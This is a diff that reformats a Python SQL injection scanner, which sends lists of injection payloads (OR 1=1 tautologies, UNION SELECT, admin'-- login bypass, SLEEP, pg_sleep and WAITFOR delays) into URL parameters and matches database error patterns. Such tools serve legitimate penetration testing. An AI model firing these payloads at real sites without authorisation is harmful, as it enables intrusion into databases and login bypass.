@@ -4,6 +4,7 @@ SQL Injection Tester - Automated SQLi vulnerability scanner
 Menguji parameter URL untuk kerentanan SQL Injection.
 Usage: python sqli_tester.py -u "http://target.com/page?id=1"
 """
+
 import requests
 import argparse
 import sys
@@ -11,34 +12,73 @@ import re
 import time
 from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
 
-
 ERROR_PATTERNS = [
-    r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"valid MySQL result",
-    r"MySqlClient\.", r"PostgreSQL.*ERROR", r"Warning.*\Wpg_.*",
-    r"valid PostgreSQL result", r"Npgsql\.", r"Driver.* SQL.*Server",
-    r"OLE DB.* SQL Server", r"\bSQL Server.*Driver", r"Warning.*mssql_.*",
-    r"\bSQL Server\b[^\n]*ERROR", r"Warning.*odbc_.*", r"\bORA-[0-9]{5}",
-    r"Oracle error", r"Oracle.*ORA-", r"Microsoft Access.*Driver",
-    r"JET Database Engine", r"Access Database Engine", r"SQLite/JDBCDriver",
-    r"SQLite\.Exception", r"System\.Data\.SQLite\.SQLiteException",
-    r"Warning.*sqlite_.*", r"Warning.*SQLite3::", r"SQLite3::query",
-    r"unclosed quotation mark", r"quoted string not properly terminated",
-    r"SQL command not properly ended", r"PSQLException",
+    r"SQL syntax.*MySQL",
+    r"Warning.*mysql_.*",
+    r"valid MySQL result",
+    r"MySqlClient\.",
+    r"PostgreSQL.*ERROR",
+    r"Warning.*\Wpg_.*",
+    r"valid PostgreSQL result",
+    r"Npgsql\.",
+    r"Driver.* SQL.*Server",
+    r"OLE DB.* SQL Server",
+    r"\bSQL Server.*Driver",
+    r"Warning.*mssql_.*",
+    r"\bSQL Server\b[^\n]*ERROR",
+    r"Warning.*odbc_.*",
+    r"\bORA-[0-9]{5}",
+    r"Oracle error",
+    r"Oracle.*ORA-",
+    r"Microsoft Access.*Driver",
+    r"JET Database Engine",
+    r"Access Database Engine",
+    r"SQLite/JDBCDriver",
+    r"SQLite\.Exception",
+    r"System\.Data\.SQLite\.SQLiteException",
+    r"Warning.*sqlite_.*",
+    r"Warning.*SQLite3::",
+    r"SQLite3::query",
+    r"unclosed quotation mark",
+    r"quoted string not properly terminated",
+    r"SQL command not properly ended",
+    r"PSQLException",
 ]
 
 SQLI_PAYLOADS = [
-    "'", "''", "`", "``", ",)", "\"", "\"\"", "' OR '1'='1",
-    "' OR '1'='1' --", "' OR '1'='1' /*", "1' ORDER BY 1--",
-    "1' ORDER BY 100--", "1 UNION SELECT NULL--", "1 UNION SELECT 1,2--",
-    "1' AND '1'='1", "1' AND '1'='2", "1 AND 1=1", "1 AND 1=2",
-    "' UNION SELECT @@version--", "'; WAITFOR DELAY '0:0:5'--",
-    "1; SELECT pg_sleep(5)--", "admin'--", "admin' OR '1'='1",
-    "1 OR 1=1#", "1' OR 1=1#", "1' OR '1'='1'#",
+    "'",
+    "''",
+    "`",
+    "``",
+    ",)",
+    '"',
+    '""',
+    "' OR '1'='1",
+    "' OR '1'='1' --",
+    "' OR '1'='1' /*",
+    "1' ORDER BY 1--",
+    "1' ORDER BY 100--",
+    "1 UNION SELECT NULL--",
+    "1 UNION SELECT 1,2--",
+    "1' AND '1'='1",
+    "1' AND '1'='2",
+    "1 AND 1=1",
+    "1 AND 1=2",
+    "' UNION SELECT @@version--",
+    "'; WAITFOR DELAY '0:0:5'--",
+    "1; SELECT pg_sleep(5)--",
+    "admin'--",
+    "admin' OR '1'='1",
+    "1 OR 1=1#",
+    "1' OR 1=1#",
+    "1' OR '1'='1'#",
 ]
 
 TIME_PAYLOADS = [
-    ("' OR SLEEP(3)--", 3), ("' OR pg_sleep(3)--", 3),
-    ("'; WAITFOR DELAY '0:0:3'--", 3), ("1' AND SLEEP(3)--", 3),
+    ("' OR SLEEP(3)--", 3),
+    ("' OR pg_sleep(3)--", 3),
+    ("'; WAITFOR DELAY '0:0:3'--", 3),
+    ("1' AND SLEEP(3)--", 3),
 ]
 
 
@@ -68,13 +108,15 @@ def test_error_based(session, url, params):
                 r = session.get(test_url, timeout=10)
                 for pattern in ERROR_PATTERNS:
                     if re.search(pattern, r.text, re.IGNORECASE):
-                        findings.append({
-                            "type": "Error-based SQLi",
-                            "url": test_url,
-                            "parameter": param_name,
-                            "payload": payload,
-                            "evidence": pattern,
-                        })
+                        findings.append(
+                            {
+                                "type": "Error-based SQLi",
+                                "url": test_url,
+                                "parameter": param_name,
+                                "payload": payload,
+                                "evidence": pattern,
+                            }
+                        )
                         return findings
             except requests.exceptions.RequestException:
                 continue
@@ -93,13 +135,15 @@ def test_time_based(session, url, params):
                 session.get(test_url, timeout=delay + 5)
                 elapsed = time.time() - start
                 if elapsed >= delay:
-                    findings.append({
-                        "type": "Time-based SQLi",
-                        "url": test_url,
-                        "parameter": param_name,
-                        "payload": payload,
-                        "delay": elapsed,
-                    })
+                    findings.append(
+                        {
+                            "type": "Time-based SQLi",
+                            "url": test_url,
+                            "parameter": param_name,
+                            "payload": payload,
+                            "delay": elapsed,
+                        }
+                    )
                     return findings
             except requests.exceptions.RequestException:
                 continue
@@ -160,4 +204,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-
